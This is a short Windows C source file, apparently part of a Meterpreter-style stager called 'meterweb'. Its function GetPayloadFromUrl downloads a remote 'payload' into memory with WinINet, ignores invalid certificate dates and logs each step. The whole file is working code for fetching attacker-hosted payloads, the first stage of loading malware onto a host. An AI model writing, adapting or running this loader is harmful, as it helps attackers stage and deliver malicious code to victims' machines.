#include "meterweb.h"

BOOL GetPayloadFromUrl(LPWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize)
{
	BOOL bSTATE = TRUE;
	HINTERNET hInternet = NULL;
	HINTERNET hInternetFile = NULL;
	DWORD dwBytesRead = NULL;
	SIZE_T sSize = NULL;
	PBYTE pBytes = NULL;
	PBYTE pTempBytes = NULL;

	hInternet = InternetOpen(L"MyAgent", NULL, NULL, NULL, 0);
	if (hInternet == NULL)
	{
		printf("[-] InternetOpen failed. Error: %d\n", GetLastError());
		bSTATE = FALSE;  goto _EndOfFunction;
	}
	printf("[+] InternetOpen successful.\n");

	hInternetFile = InternetOpenUrlW(
		hInternet, szUrl, NULL, NULL,
		INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
	if (hInternetFile == NULL)
	{
		printf("[-] InternetOpenUrlW failed. Error: %d\n", GetLastError());
		bSTATE = FALSE;  goto _EndOfFunction;
	}
	printf("[+] InternetOpenUrlW successful.\n");

	pTempBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTempBytes == NULL)
	{
		printf("[-] LocalAlloc failed. Error: %d\n", GetLastError());
		bSTATE = FALSE;  goto _EndOfFunction;
	}
	printf("[+] LocalAlloc successful.\n");

	while (TRUE)
	{
		if (!InternetReadFile(hInternetFile, pTempBytes, 1024, &dwBytesRead))
		{
			printf("[-] InternetReadFile failed. Error: %d\n", GetLastError());
			bSTATE = FALSE;  goto _EndOfFunction;
		}
		printf("[+] InternetReadFile successful.\n");

		sSize += dwBytesRead;

		if (pBytes == NULL)
		{
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		}
		else
		{
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
		}

		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTempBytes, dwBytesRead);
		memset(pTempBytes, '\0', dwBytesRead);

		if (dwBytesRead < 1024)
			break;
	}

	*pPayloadBytes = pBytes;
	*sPayloadSize = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);
	if (hInternet)
		InternetSetOption(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, NULL);
	if (pTempBytes)
		LocalFree(pTempBytes);
	return bSTATE;
}